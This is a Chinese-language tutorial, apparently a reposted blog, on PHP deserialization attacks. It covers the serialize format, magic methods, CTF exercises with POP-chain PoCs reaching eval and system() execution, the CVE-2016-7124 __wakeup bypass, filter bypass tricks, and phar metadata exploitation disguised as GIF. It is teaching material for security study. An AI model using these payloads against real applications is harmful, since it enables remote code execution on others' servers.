# 反序列化

原文链接：https://blog.csdn.net/solitudi/article/details/113588692

## 序列化与反序列化基础

```php
序列化：是将变量转换位可保存或传输的字符串的过程
序列化的目的是方便数据的传输和存储，在PHP中，序列化和反序列化一般用做缓存，比如session缓存，cookie等
    
反序列化：在适当时候把这个字符串在转换位原来的变量使用
```

## php反序列化

```php
serialize ：将对象格式化成有序的字符串

unserialize : 可以将serialize生成的字符串还原

php进行反序列化是为了保存一个对象方便以后调用
```

###  案例引入

```php
<?php
$user=array('xiao','shi','zi');
$user=serialize($user);
echo($user.PHP_EOL);
print_r(unserialize($user));
```

他会输出

```php
a:3:{i:0;s:4:"xiao";i:1;s:3:"shi";i:2;s:2:"zi";}
Array
(
    [0] => xiao
    [1] => shi
    [2] => zi
)
```

将案例分解  

```php
a:3:{i:0;s:4:"xiao";i:1;s:3:"shi";i:2;s:2:"zi";}
a:array代表是数组，后面的3说明有三个属性
i:代表是整型数据int，后面的0是数组下标
s:代表是字符串，后面的4是因为xiao长度为4
    
依次类推
```

序列化后的内容只有成员变量，没有成员函数 如：

```php
<?php
class test{
    public $a;
    public $b;
    function __construct(){$this->a = "xiaoshizi";$this->b="laoshizi";}
    function happy(){return $this->a;}
}
$a = new test();
echo serialize($a);
?>

```

输出(O代表Object是对象的意思，也是类）

```php
O:4:"test":2:{s:1:"a";s:9:"xiaoshizi";s:1:"b";s:8:"laoshizi";}
```

而如果变量前是protected（受保护的），则会在变量名前加上`\x00*\x00`,

private(私有的)则会在变量名前加上`\x00类名\x00`,输出时一般需要url编码，若在本地存储更推荐采用base64编码的形式，如下：

```php
<?php
class test{
    protected  $a;
    private $b;
    function __construct(){$this->a = "xiaoshizi";$this->b="laoshizi";}
    function happy(){return $this->a;}
}
$a = new test();
echo serialize($a);
echo urlencode(serialize($a));
?>

```

输出是\00 不可见

```php
O:4:"test":2:{s:4:" * a";s:9:"xiaoshizi";s:7:" test b";s:8:"laoshizi";}
```

### 反序列化中常见魔法方法

```php
__construct() //当一个对象创建时被调用
__destruct()  // 当一个对象被销毁时触发
__sleep()     // 当一个对象serialize时被调用
__wakeup()    //使用unserialize时触发
__toString()  //当一个对象被当作一个字符串被调用
__invoke()    //当脚本尝试将对象调用为函数时触发
__call() 	  //在对象上下文中调用不可访问的方法时触发
__get()		  // 用于从不可访问的属性读取数据
__set()		  //用于将数据写入不可访问的属性
__isset       //在不可访问的属性上调用isset()或empty()时触发
__unset	      //在不可访问的属性上使用unset()时触发
```

```php
当一个对象创建时被调用 __construct()
<?php
class Test
{
    public $test;
    #当一个对象创建时被调用
    function __construct($name)
    {
        echo "construct!</br>";
        $this->test=$name;
    }
    function  t(){
        echo $this->test;
    }
}
$t=new Test("construct test!");
echo "lalala</br>";
$t->t();
?>
```
```php
当一个对象被销毁时触发 __destruct()
<?php
class Test
{
    public $test;
    #当一个对象被销毁时触发
    function __destruct()
    {
        echo 'destruct!</br>';
    }
}
$t=new Test();
echo 'test!</br>';
?>
```
```php
当一个对象serialize时被调用 __sleep()
<?php
class Test
{
    public $test;
    #当一个对象serialize时被调用
    function __sleep(){
        echo 'sleep!</br>';
    }
}
$t=new Test();
echo 'test</br>';
serialize($t);
?>
```

```php
使用unserialize时触发 __wakeup()
<?php
class Test
{
    public $test;
    #使用unserialize时触发
    function __wakeup(){
        echo 'wakeup!</br>';
    }
}
$t=new Test();
$tt=serialize($t);
echo 'test</br>';
unserialize($tt);
?>
```

```php
当一个对象被当作一个字符串被调用 __toString()
<?php

class Test
{
    public $test;
    #当一个对象被当作一个字符串被调用
    public function __toString() {
        return 'tostring!</br>';
    }
}
$t=new Test();
echo $t;
?>
```

```php
当脚本尝试将对象调用为函数时触发 __invoke()
<?php

class Test
{
    public $test;
    #当脚本尝试将对象调用为函数时触发
    function __invoke($x) {
        echo 'invoke!</br>';
        var_dump($x); # __dump 判断参数类型和长度 
    }
}
$t=new Test();
$t("just test invoke!");
?>
```

```php
在对象上下文中调用不可访问的方法时触发 __call() 
<?php
class Test
{
    public $test;
    #在对象上下文中调用不可访问的方法时触发
    function __call($name,$args) {  
        # $name 是不可调用的函数的函数名 ，$args 是传入的参数
        echo 'name:'.$name.'</br>';
        echo 'args:';
        var_dump($args);
    }
}
$t=new Test();
$t->t('call test!',123456);
?>
```

```php
用于从不可访问的属性读取数据  __get()
<?php
   class Test
{
    public $test;
    #用于从不可访问的属性读取数据
    function __get($name){
        echo 'get!</br>';
        echo '想要获取的属性名为:'.$name.'</br>';
    }
}
$t=new Test();
$name=$t->lalala;
?>
```

```php
用于将数据写入不可访问的属性__set()
<?php
class Test
{
    public $test;
    #用于将数据写入不可访问的属性
    function __set($name,$val){
        echo 'set!</br>';
        echo 'name:'.$name.'</br>';
        echo 'val:'.$val.'</br>';
    }
}
$t=new Test(); 
$t->lalala=123;
?>
```

##### 例题1

```
<?php
class A{
    public function __call($name, $arguments)
    {
        eval($arguments[0]);
    }
}
class B{
    public $x;
    public $y;
    public function __destruct()
    {
        $this->x->nihao($this->y); // 对象B 调用变量 x —> nihao(变量y)  
    }
    public function nihao()
    {
        echo "nihao";
    }
}
$a = $_GET['test'];
$a_unser = unserialize($a);

highlight_file(__FILE__)
?>
```

poc(1)

```
<?php
class A{
    public function __call($name, $arguments)
    {
        eval($arguments[0]);
    }
}
class B{
    public $x;
    public $y;
    public function __construct(){
        $this->x=new A();
        $this->y='phpinfo();';
    }
    public function nihao()
    {
        echo "nihao";
    }

}
$b=new B();
echo serialize($b);

// 敏感函数是eval 在 类 A中 
// 类A 中存在一个魔法方法 ：__call 调用不存在的方法时触发  ==> 目标就是触发 __call 方法
// 类B 中 对象B 调用变量 x = nihao(变量y) 

//构造poc x=new A      x->niao(y) 对象X 调用类A 中不存在的方法nihao 报错 触发 __call($name, $arguments) $name=y $arguments=y的参数
//给y赋值 y='phpinfo();';
```

##### 例题2

```php
读取flag
<?php
highlight_file(__FILE__);
#flag is  flag.txt
class getshell
{
    public $hello;
    public function __call($name, $arguments)
    {
        $this->hello[$name]($arguments[0]);
    }
}

class b
{
    public $x;
    public $y;

    public function __destruct()
    {
        $this->x->nihao($this->y);
    }

    public function nihao()
    {
        echo "nihao";

    }
}

@unserialize(base64_decode($_POST['a']));
```

poc

```php
<?php
highlight_file(__FILE__);
#flag is  flag.txt
class getshell
{
    public $hello;
    public function __construct()
    {
        $this->hello =['nihao'=>'system']; //关联数组 
    }
}
class b
{
    public $x;
    public $y;

    public function __construct()
    {
        $this->x=new getshell();
        $this->y='type flag.txt';
    }

}
$b = new b();
echo base64_encode(serialize($b));
```

### php7.1+ 反序列化对类属性不敏感

我们前面说了如果变量前是protected，序列化结果会在变量名前加上`\00*\00`

但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有`\00*\00`也依然会输出`abc`

```php
<?php
class test{
    protected $a;
    public function __construct(){
        $this->a = 'abc';
    }
    public function  __destruct(){
        echo $this->a;
    }
}
unserialize('O:4:"test":1:{s:1:"a";s:3:"abc";}');

```

### 绕过__wakeup(CVE-2016-7124)

```
版本：

​ PHP5 < 5.6.25

​ PHP7 < 7.0.10
```

```php
利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行
<?php
class test{
    public $a;
    public function __construct(){
        $this->a = 'abc';
    }
    public function __wakeup(){
        $this->a='666';
    }
    public function  __destruct(){
        echo $this->a;
    }
}

```

```php
如果执行unserialize('O:4:"test":1:{s:1:"a";s:3:"abc";}');输出结果为666

而把对象属性个数的值增大执行unserialize('O:4:"test":2:{s:1:"a";s:3:"abc";}');输出结果为abc
```

### 16进制绕过字符的过滤

```php
O:4:"test":2:{s:4:"%00*%00a";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
可以写成
O:4:"test":2:{S:4:"\00*\00\61";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
表示字符类型的s大写时，会被当成16进制解析。

```

```php
<?php
class test{
    public $username;
    public function __construct(){
        $this->username = 'admin';
    }
    public function  __destruct(){
        echo 666;
    }
}
function check($data){
    if(stristr($data, 'username')!==False){
        echo("你绕不过！！".PHP_EOL);
    }
    else{
        return $data;
    }
}
// 未作处理前
$a = 'O:4:"test":1:{s:8:"username";s:5:"admin";}';
$a = check($a);
unserialize($a);
// 做处理后 \75是u的16进制
$a = 'O:4:"test":1:{S:8:"\\75sername";s:5:"admin";}';
$a = check($a);
unserialize($a);
```

### 绕过部分正则

`preg_match('/^O:\d+/')`匹配序列化字符串是否是对象字符串开头

利用加号绕过（注意在url里传参时+要编码为%2B）
serialize(array(a ) ) ; / / a));//a));//a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)

------------------------------------------------
```php
<?php
class test{
    public $a;
    public function __construct(){
        $this->a = 'abc';
    }
    public function  __destruct(){
        echo $this->a.PHP_EOL;
    }
}

function match($data){
    if (preg_match('/^O:\d+/',$data)){
        die('you lose!');
    }else{
        return $data;
    }
}
$a = 'O:4:"test":1:{s:1:"a";s:3:"abc";}';
// +号绕过
$b = str_replace('O:4','O:+4', $a);
unserialize(match($b));
// serialize(array($a));
unserialize('a:1:{i:0;O:4:"test":1:{s:1:"a";s:3:"abc";}}');

```

利用 poc

```php
<?php
class test{
    public $a;
    public $b;
    public function __construct(){
        $this->a = 'abc';
        $this->b= &$this->a;
    }
    public function  __destruct(){

        if($this->a===$this->b){
            echo 666;
        }
    }
}
$a = serialize(new test());

```

## Phar反序列化

phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容。

### 什么是phar文件

在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发

php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如(fopen(),copy(),file_exists()和filesize()。 phar://就是一种内置的流包装器。

php中一些常见的流包装器如下：

```php
file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流
```

### phar文件的结构

```php
stub:phar文件的标志，必须以 xxx __HALT_COMPILER();?> 结尾，否则无法识别。xxx可以为自定义内容。
manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。
content:被压缩文件的内容
signature (可空):签名，放在末尾。

```

如何生成一个phar文件？下面给出一个参考例子

```php
<?php
    class Test {
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new Test();
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>

```

### 漏洞利用条件

1. phar文件要能够上传到服务器端。

2. 要有可用的魔术方法作为“跳板”。

3. 文件操作函数的参数可控，且`:`、`/`、`phar`等特殊字符没有被过滤。

   #### 受影响的函数

   ![](F:\长亭\image-20220425153242033.png)

实际上不止这些，也可以参考这篇链接，里面有详细说明https://blog.zsxsoft.com/post/38

```php
//exif
exif_thumbnail
exif_imagetype
    
//gd
imageloadfont
imagecreatefrom***系列函数
    
//hash
    
hash_hmac_file
hash_file
hash_update_file
md5_file
sha1_file
    
// file/url
get_meta_tags
get_headers
    
//standard 
getimagesize
getimagesizefromstring
    
// zip   
$zip = new ZipArchive();
$res = $zip->open('c.zip');
$zip->extractTo('phar://test.phar/test');
// Bzip / Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过
$z = 'compress.bzip2://phar:///home/sx/test.phar/test.txt';
$z = 'compress.zlib://phar:///home/sx/test.phar/test.txt';

//配合其他协议：(SUCTF)
//https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d/
//当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。
//php://filter/read=convert.base64-encode/resource=phar://phar.phar

//Postgres pgsqlCopyToFile和pg_trace同样也是能使用的，需要开启phar的写功能。
<?php
	$pdo = new PDO(sprintf("pgsql:host=%s;dbname=%s;user=%s;password=%s", "127.0.0.1", "postgres", "sx", "123456"));
	@$pdo->pgsqlCopyFromFile('aa', 'phar://phar.phar/aa');
?>
    
// Mysql
//LOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper
//配置一下mysqld:
//[mysqld]
//local-infile=1
//secure_file_priv=""
    
<?php
class A {
    public $s = '';
    public function __wakeup () {
        system($this->s);
    }
}
$m = mysqli_init();
mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
$s = mysqli_real_connect($m, 'localhost', 'root', 'root', 'testtable', 3306);
$p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \'phar://test.phar/test\' INTO TABLE a  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;');
?>

```

### 绕过方式

当环境限制了phar不能出现在前面的字符里。可以使用`compress.bzip2://`和`compress.zlib://`等绕过

```php
compress.bzip://phar:///test.phar/test.txt
compress.bzip2://phar:///test.phar/test.txt
compress.zlib://phar:///home/sx/test.phar/test.txt
php://filter/resource=phar:///test.phar/test.txt

当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。
php://filter/read=convert.base64-encode/resource=phar://phar.phar

GIF格式验证可以通过在文件头部添加GIF89a绕过
1、$phar->setStub(“GIF89a”.“<?php __HALT_COMPILER(); ?>”); //设置stub
2、生成一个phar.phar，修改后缀名为phar.gif
```











































